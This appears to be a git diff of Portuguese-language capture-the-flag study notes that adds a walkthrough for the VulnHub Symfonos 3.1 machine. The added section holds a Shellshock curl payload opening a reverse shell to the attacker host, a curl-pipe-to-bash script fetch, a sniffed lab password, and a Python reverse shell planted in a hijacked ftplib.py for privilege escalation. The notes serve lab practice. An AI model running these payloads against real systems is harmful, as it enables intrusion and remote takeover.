@@ -16,7 +16,8 @@ Desafio 13 - https://www.vulnhub.com/entry/raven-2,269/		</br>
 Desafio 14 - https://www.vulnhub.com/entry/the-library-1,334/ 	</br>
 Desafio 15 - https://www.vulnhub.com/entry/symfonos-2,331/</br>
 Desafio 16 - https://www.vulnhub.com/entry/symfonos-31,332/</br>
-Desafio 17 - </br>
+Desafio 17 - https://www.vulnhub.com/entry/nezuko-1,352/ </br>
+Desafio 18 - </br>
 <br/>**--VM--**
 	
 	
@@ -664,3 +665,57 @@ Desafio 17 - </br>
 		sudo -l
 		sudo /usr/bin/mysql
 			\! sh
+
+
+<h3>Dia 16 			22/9/2020</h3>
+
+	*instalar o go -> https://www.edivaldobrito.com.br/linguagem-go-no-linux/
+	*instalar o pspy -> https://vk9-sec.com/how-to-enumerate-services-in-use-with-pspy/
+			# apt install golangapt -> apt install golang
+			
+	*scan default
+	
+	*dirb http://ip 
+		#cgi-bin
+		browser:ver código fonte/view-source:ip
+			view-source:http://192.168.100.21/
+			#Can you bust the underworld#
+				http://ip/cgi-bin/underworld
+		
+	*nc -lnvp 443
+		* curl -H "User-Agent: () { :; }; echo; /bin/bash -c ‘nc ip_kali 443 -e /bin/bash’" http://ip_alvo/cgi-bin/underworld
+			*na seção do nc:  python -c 'import pty;pty.spawn("/bin/bash")'
+	
+	*executar o LinEnum
+		kali-> pyhton -m SimpleHTTPServer 8080
+		alvo-> curl -s http://ip_kali:8080/arquivo_LinEnum | bash
+		
+	*tcpdump -v -i lo port 21 
+		user: hades
+		pass:  PTpZTfU4vxgzvRBE
+		
+	*ssh hades@ip_alvo
+		pass:  PTpZTfU4vxgzvRBE
+	
+	*scp arquivo hades@192.168.100.21:/tmp
+	
+	* cd /opt/ftpclient
+			cat ftpclient.py
+				#import ftplib
+
+	*find / -writable -type d 2>&-
+		/usr/lib/python2.7
+		cd /usr/lib/python2.7
+		ls tfp*
+
+		rm ftplib.py
+		nano ftplib.py
+			import socket,subprocess,os
+			s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+			s.connect(("10.0.0.4",443))      -> ip_kali e porta
+			os.dup2(s.fileno(),0)
+			os.dup2(s.fileno(),1)
+			os.dup2(s.fileno(),2)
+			p=subprocess.call(["/bin/sh","-i"]);
+				
+		*nc -lnvp 443 	-> aguardar a conexão
